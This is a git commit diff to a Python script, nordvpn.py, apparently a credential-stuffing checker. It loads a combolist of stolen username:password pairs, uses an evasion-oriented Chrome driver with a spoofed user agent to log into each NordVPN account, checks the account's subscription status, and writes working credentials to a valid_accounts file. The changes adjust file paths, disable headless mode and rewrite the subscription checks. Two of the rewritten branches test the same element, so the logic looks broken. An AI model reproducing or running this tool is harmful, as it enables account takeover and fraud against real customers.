a0bfb9ab502b29a20fe13be50474a7933a21443d
g3th <theinkandpen@yahoo.co.uk>
2023-09-20 16:51:33 +0100

    fixed: headless mode not supported by undetected_chromedriver package

--- nordvpn.py
+++ nordvpn.py
@@ -10,34 +10,41 @@ from header import title
 user = []
 password = []
 if getattr(sys, 'frozen', False):# and hasattr(sys, 'MEIPASS'):
-    user_directory = str(Path(sys.executable).parent)
+    user_directory = str(Path(sys.executable).parent) + "\\nord.txt"
+    save_directory = str(Path(sys.executable).parent) + "\\valid_accounts"
+    os.makedirs(save_directory, exist_ok=True)
+    save_file = "\\valid_accounts.txt"
 else:
-    user_directory = str(Path(__file__).parent)
+    user_directory = str(Path(__file__).parent) + "/nord.txt"
+    save_directory = str(Path(__file__).parent) + "/valid_accounts"
+    os.makedirs(save_directory, exist_ok=True)
+    save_file = "/valid_accounts.txt"
 try:
-    with open (user_directory + "\\nord.txt", 'r') as combos:
+    os.remove(save_directory + save_file)
+except FileNotFoundError:
+    pass
+try:
+    with open (user_directory, 'r') as combos:
         for i in combos.readlines():
             user.append(i.split(":")[0])
             password.append(i.split(":")[1].split(" ")[0].strip())
-except FileNotFoundError:
+except FileNotFoundError as e:
     print("No combolist found in: " + user_directory + "\nPlease add 'nord.txt' and try again.\nPress Enter to end.")
     input()
     exit()
-try:
-    os.remove('nord_accounts.txt')
-except FileNotFoundError:
-    pass
+
 index = 0
+title()
 while index != len(user):
-    title()
-    with open(user_directory + "\\nord_accounts.txt", 'a') as accounts:
+    with open(save_directory + save_file, 'a') as accounts:
         browser_options = stealthdriver.ChromeOptions()
         browser_options.add_argument(
             'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '
             'Chrome/103.0.5060.134 ''Safari/537.36')
-        browser_options.add_argument('--headless=new')
+        #browser_options.add_argument('--headless=new')
         browser = stealthdriver.Chrome(options=browser_options)
         page = 'https://www.nordvpn.com/'
-        browser.set_window_size(800, 300)
+        browser.set_window_size(800, 200)
         browser.get(page)
         print('\rTrying Combo {} out of {}'.format(index + 1, len(user)), end='')
         time.sleep(2)
@@ -59,11 +66,14 @@ while index != len(user):
             subscription_page = 'https://my.nordaccount.com/billing/my-subscriptions/'
             browser.get(subscription_page)
             time.sleep(4)
-            text = browser.find_element(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div/div/div/div[1]/div[2]/div').text
-            if 'Active' in text:
+            if browser.find_elements(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p'):
+            	no_sub = browser.find_element(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p').text
+            	if 'No active subscriptions' in no_sub:
+            		print(" | {}:{} ---> No Active Subscription".format(user[index], password[index]))
+            if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div'):
                 print(" | {}:{} ---> Success!".format(user[index], password[index]))
-                accounts.write(user[index] + ":" + password[index] + "\n")
-            else:
+                accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
+            if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div'):
                 print(" | {}:{} ---> Expired!".format(user[index], password[index]))
         else:
             print(" | {}:{} ---> Account not working".format(user[index], password[index]))
